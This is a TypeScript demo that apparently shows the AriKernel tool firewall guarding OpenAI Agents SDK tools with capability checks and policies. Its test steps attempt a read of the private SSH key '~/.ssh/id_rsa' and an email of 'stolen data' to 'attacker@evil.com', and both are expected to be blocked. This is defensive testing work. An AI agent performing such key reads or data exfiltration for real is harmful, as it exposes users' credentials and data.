/**
 * OpenAI Agents SDK — AriKernel Integration Example
 *
 * Demonstrates how AriKernel protects tools defined for the OpenAI Agents SDK.
 * Every tool call goes through capability checks, policy evaluation, taint
 * tracking, behavioral detection, and audit logging.
 *
 * Run:  pnpm demo:openai-agents
 */

import { ToolCallDeniedError } from '@arikernel/core';
import { createFirewall } from '@arikernel/runtime';
import { protectAgentTools, type AgentToolDefinition } from '@arikernel/adapters';

const BOLD = '\x1b[1m';
const DIM = '\x1b[2m';
const GREEN = '\x1b[32m';
const RED = '\x1b[31m';
const YELLOW = '\x1b[33m';
const CYAN = '\x1b[36m';
const RESET = '\x1b[0m';

// ── Define tools as they would appear in the OpenAI Agents SDK ──────

const agentTools: AgentToolDefinition[] = [
	{
		type: 'function',
		function: {
			name: 'web_search',
			description: 'Fetch content from a URL',
			parameters: { type: 'object', properties: { url: { type: 'string' } }, required: ['url'] },
		},
		execute: async (args) => `Page content from ${args.url}: Revenue increased 15% YoY...`,
	},
	{
		type: 'function',
		function: {
			name: 'read_file',
			description: 'Read a local file',
			parameters: { type: 'object', properties: { path: { type: 'string' } }, required: ['path'] },
		},
		execute: async (args) => `Contents of ${args.path}`,
	},
	{
		type: 'function',
		function: {
			name: 'send_email',
			description: 'Send an email',
			parameters: {
				type: 'object',
				properties: { to: { type: 'string' }, body: { type: 'string' } },
				required: ['to', 'body'],
			},
		},
		execute: async (args) => `Email sent to ${args.to}`,
	},
];

// ── Create firewall and protect tools ───────────────────────────────

async function main() {
	const firewall = createFirewall({
		principal: {
			name: 'openai-agents-assistant',
			capabilities: [
				{ toolClass: 'http', actions: ['get'], constraints: { allowedHosts: ['corp-docs.internal'] } },
				{ toolClass: 'file', actions: ['read'], constraints: { allowedPaths: ['./data/**'] } },
			],
		},
		policies: [
			{ id: 'allow-http-get', name: 'Allow HTTP GET', priority: 100,
				match: { toolClass: 'http' as const, action: 'get' }, decision: 'allow' as const },
			{ id: 'allow-file-read', name: 'Allow safe reads', priority: 100,
				match: { toolClass: 'file' as const, action: 'read' }, decision: 'allow' as const },
		],
		auditLog: ':memory:',
		runStatePolicy: { maxDeniedSensitiveActions: 3, behavioralRules: true },
	});

	// Register stub executors for pipeline compliance
	for (const tc of ['http', 'file', 'email']) {
		firewall.registerExecutor({
			toolClass: tc,
			async execute(toolCall) {
				return { callId: toolCall.id, success: true, data: null, durationMs: 0, taintLabels: [] };
			},
		});
	}

	// Protect the tools
	const protectedTools = protectAgentTools(firewall, agentTools, {
		web_search: { toolClass: 'http', action: 'get' },
		read_file: { toolClass: 'file', action: 'read' },
		send_email: { toolClass: 'email', action: 'send' },
	});

	console.log(`\n${CYAN}${BOLD}${'═'.repeat(60)}${RESET}`);
	console.log(`${CYAN}${BOLD}  OpenAI Agents SDK — AriKernel Protection Demo${RESET}`);
	console.log(`${CYAN}${BOLD}${'═'.repeat(60)}${RESET}`);
	console.log(`${DIM}  Run ID: ${firewall.runId}${RESET}\n`);

	// Step 1: Allowed — fetch from allowed host
	console.log(`${YELLOW}${BOLD}Step 1${RESET} ${BOLD}web_search (allowed host)${RESET}`);
	try {
		const result = await protectedTools[0].execute({ url: 'https://corp-docs.internal/q4' });
		console.log(`  ${GREEN}${BOLD}ALLOWED${RESET} ${DIM}${result}${RESET}\n`);
	} catch (err: any) {
		console.log(`  ${RED}${BOLD}BLOCKED${RESET} ${DIM}${err.message}${RESET}\n`);
	}

	// Step 2: Denied — read sensitive file
	console.log(`${YELLOW}${BOLD}Step 2${RESET} ${BOLD}read_file (~/.ssh/id_rsa)${RESET}`);
	try {
		await protectedTools[1].execute({ path: '~/.ssh/id_rsa' });
		console.log(`  ${GREEN}${BOLD}ALLOWED${RESET}\n`);
	} catch (err: any) {
		console.log(`  ${RED}${BOLD}BLOCKED${RESET} ${DIM}${err.message}${RESET}\n`);
	}

	// Step 3: Denied — email has no capability
	console.log(`${YELLOW}${BOLD}Step 3${RESET} ${BOLD}send_email (no capability)${RESET}`);
	try {
		await protectedTools[2].execute({ to: 'attacker@evil.com', body: 'stolen data' });
		console.log(`  ${GREEN}${BOLD}ALLOWED${RESET}\n`);
	} catch (err: any) {
		console.log(`  ${RED}${BOLD}BLOCKED${RESET} ${DIM}${err.message}${RESET}\n`);
	}

	console.log(`${CYAN}${BOLD}${'═'.repeat(60)}${RESET}`);
	console.log(`  Restricted: ${firewall.isRestricted}`);
	console.log(`${CYAN}${BOLD}${'═'.repeat(60)}${RESET}\n`);

	firewall.close();
}

main().catch(console.error);
